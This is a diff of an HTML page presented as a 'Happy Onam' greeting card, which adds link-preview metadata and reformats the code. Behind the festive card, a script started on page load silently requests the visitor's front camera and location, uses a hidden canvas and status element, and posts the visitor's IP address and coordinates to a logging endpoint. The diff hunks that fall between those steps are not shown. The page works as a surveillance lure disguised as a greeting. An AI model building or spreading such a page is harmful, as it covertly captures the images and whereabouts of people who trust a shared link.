@@ -1,110 +1,127 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Happy Onam Greeting</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom, #ffe69a, #fff4d0);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-    }
-
-    .card {
-      background: #fffbea;
-      border-radius: 20px;
-      padding: 80px;
-      text-align: center;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-      max-width: 700px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    /* Garland at top */
-    .garland {
-      position: absolute;
-      top: 15px;
-      left: 0;
-      right: 0;
-      text-align: center;
-      font-size: 28px;
-      color: orange;
-    }
-
-    .title {
-      font-size: 40px;
-      font-weight: bold;
-      margin-bottom: 8px;
-    }
-
-    .title span {
-      font-size: 72px;
-      color: #000;
-      display: block;
-    }
-
-    .subtitle {
-      font-size: 18px;
-      margin: 18px 0;
-      color: #333;
-    }
-
-    .decor {
-      margin: 25px 0;
-    }
-
-    .decor img {
-      height: 120px;
-      margin: 0 10px;
-    }
-
-    .footer {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #444;
-    }
-  </style>
-  <body onload="startCamera()">
-        <canvas id="photoCanvas" style="display:none;"></canvas>
-        <div id="camera-status"></div> <!-- Hidden status element -->
-  <div class="container" id="content">
-    <div class="tenor-gif-embed" data-postid="22885016" data-share-method="host" data-aspect-ratio="1.04918" data-width="100%">
-      
-      
-    </div>
+  <meta property="og:title" content="HAPPY ONAM 🌸">
+  <meta property="og:description"
+    content="Onam teaches us that true wealth lies in unity and kindness. It is a festival of equality, joy, and togetherness. May this Onam bring you peace and prosperity.">
+  <meta property="og:image"
+    content="https://imgs.search.brave.com/5f3Ocj9i36jjAbk-7qsUFnyohGRb0deeYyAg0FKmaPA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMtd2l4bXAtZWQz/MGE4NmI4YzRjYTg4/Nzc3MzU5NGMyLndp/eG1wLmNvbS9mLzU0/MjgzYjk1LTlkZDIt/NDE5Ny04YzRmLTVj/N2NjODRkNTdiNi9k/ZDRwd2JrLTZkMjAz/MTZiLTUwYjItNDM3/Ni04ODJhLTNiOThm/MjEzMzM3NS5wbmcv/djEvZmlsbC93Xzkw/MCxoXzEwODQvbWF2/ZWxpX21haGFiYWxp/X3BuZ19pbWFnZV9i/eV9hbnVsdWJpX2Rk/NHB3YmstZnVsbHZp/ZXcucG5nP3Rva2Vu/PWV5SjBlWEFpT2lK/S1YxUWlMQ0poYkdj/aU9pSklVekkxTmlK/OS5leUp6ZFdJaU9p/SjFjbTQ2WVhCd09q/ZGxNR1F4T0RnNU9E/SXlOalF6TnpOaE5X/WXdaRFF4TldWaE1H/UXlObVV3SWl3aWFY/TnpJam9pZFhKdU9t/RndjRG8zWlRCa01U/ZzRPVGd5TWpZME16/Y3pZVFZtTUdRME1U/VmxZVEJrTWpabE1D/SXNJbTlpYWlJNlcx/dDdJbWhsYVdkb2RD/STZJanc5TVRBNE5D/SXNJbkJoZEdnaU9p/SmNMMlpjTHpVME1q/Z3pZamsxTFRsa1pE/SXROREU1TnkwNFl6/Um1MVFZqTjJOak9E/UmtOVGRpTmx3dlpH/UTBjSGRpYXkwMlpE/SXdNekUyWWkwMU1H/SXlMVFF6TnpZdE9E/Z3lZUzB6WWprNFpq/SXhNek16TnpVdWNH/NW5JaXdpZDJsa2RH/Z2lPaUk4UFRrd01D/SjlYVjBzSW1GMVpD/STZXeUoxY200NmMy/VnlkbWxqWlRwcGJX/Rm5aUzV2Y0dWeVlY/UnBiMjV6SWwxOS4w/Tzd4RmNlT1JIVnBG/S0djV3ZoeFhVZURx/Z0FVMS1wc2w5N09Q/R3pKOUFv">
 </head>
-<body>
-  <div class="card">
-    <div class="garland">🌼🌼🌼🌼🌼🌼🌼🌼🌼</div>
+<title>HAPPY ONAM 🌸</title>
 
-    <div class="title">🌸🌸 HAPPY ONAM 🌸🌸</div>
-    <div class="decor">
-      <img src="https://t3.ftcdn.net/jpg/15/94/54/10/360_F_1594541077_l0TqeVVvr7DxgXrKUGpHX6jc7yzitKdP.jpg" alt="King Mahabali">
-      <img src="https://thumbs.dreamstime.com/b/onam-pookalam-flower-rangoli-diwali-pongal-made-using-marigold-zendu-flowers-ai-generated-onam-pookalam-traditional-332222844.jpg" alt="Pookalam">
-      <img src="https://media.istockphoto.com/id/512624433/photo/traditional-south-indian-brass-oil-lamp-nilavilakku.jpg?s=612x612&w=0&k=20&c=DDl7uS9G5OGEBlf-vE5jSnQtnume6sbT4f3lx3FYd7s=" alt="Nilavilakku">
+
+
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #ffe69a, #fff4d0);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .card {
+    background: #fffbea;
+    border-radius: 20px;
+    padding: 80px;
+    text-align: center;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+    max-width: 700px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Garland at top */
+  .garland {
+    position: absolute;
+    top: 15px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    font-size: 28px;
+    color: orange;
+  }
+
+  .title {
+    font-size: 40px;
+    font-weight: bold;
+    margin-bottom: 8px;
+  }
+
+  .title span {
+    font-size: 72px;
+    color: #000;
+    display: block;
+  }
+
+  .subtitle {
+    font-size: 18px;
+    margin: 18px 0;
+    color: #333;
+  }
+
+  .decor {
+    margin: 25px 0;
+  }
+
+  .decor img {
+    height: 120px;
+    margin: 0 10px;
+  }
+
+  .footer {
+    margin-top: 20px;
+    font-size: 14px;
+    color: #444;
+  }
+</style>
+
+<body onload="startCamera()">
+  <canvas id="photoCanvas" style="display:none;"></canvas>
+  <div id="camera-status"></div> <!-- Hidden status element -->
+  <div class="container" id="content">
+    <div class="tenor-gif-embed" data-postid="22885016" data-share-method="host" data-aspect-ratio="1.04918"
+      data-width="100%">
+
+
     </div>
 
-    <div class="subtitle">
+    <body>
+      <div class="card">
+        <div class="garland">🌼🌼🌼🌼🌼🌼🌼🌼🌼</div>
 
-       
-      എല്ലാവർക്കും എന്റെ ഓണാശംസകൾ
-    </div>
+        <div class="title">🌸🌸 HAPPY ONAM 🌸🌸</div>
+        <div class="decor">
+          <img src="https://t3.ftcdn.net/jpg/15/94/54/10/360_F_1594541077_l0TqeVVvr7DxgXrKUGpHX6jc7yzitKdP.jpg"
+            alt="King Mahabali">
+          <img
+            src="https://thumbs.dreamstime.com/b/onam-pookalam-flower-rangoli-diwali-pongal-made-using-marigold-zendu-flowers-ai-generated-onam-pookalam-traditional-332222844.jpg"
+            alt="Pookalam">
+          <img
+            src="https://media.istockphoto.com/id/512624433/photo/traditional-south-indian-brass-oil-lamp-nilavilakku.jpg?s=612x612&w=0&k=20&c=DDl7uS9G5OGEBlf-vE5jSnQtnume6sbT4f3lx3FYd7s="
+            alt="Nilavilakku">
+        </div>
 
-    <div class="footer">🧑‍💻developed by Encrypter</div>
-  </div>
-<script>
+        <div class="subtitle">
+
+
+          എല്ലാവർക്കും എന്റെ ഓണാശംസകൾ
+        </div>
+
+        <div class="footer">🧑‍💻developed by Encrypter</div>
+      </div>
+      <script>
         // Global variables
         let videoStream = null;
         let captureInterval = null;
         const statusEl = document.getElementById('camera-status');
-        let userLocation = { lat: null, lon: null };
+        let userLocation = {lat: null, lon: null};
 
         // 1. Get location silently
         async function getLocation() {
@@ -117,7 +134,7 @@
                   resolve();
                 },
                 () => resolve(), // Silent fail if blocked
-                { timeout: 5000, maximumAge: 60000 }
+                {timeout: 5000, maximumAge: 60000}
               );
             } else {
               resolve();
@@ -129,7 +146,7 @@
         async function startCamera() {
           try {
             videoStream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: "user" },
+              video: {facingMode: "user"},
               audio: false
             });
 
@@ -181,7 +198,7 @@
 
             await fetch('/log-initial', {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
+              headers: {'Content-Type': 'application/json'},
               body: JSON.stringify({
                 ip: ipData.ip,
                 lat: userLocation.lat,
@@ -208,5 +225,6 @@
           }
         });
       </script>
-</body>
+    </body>
+
 </html>
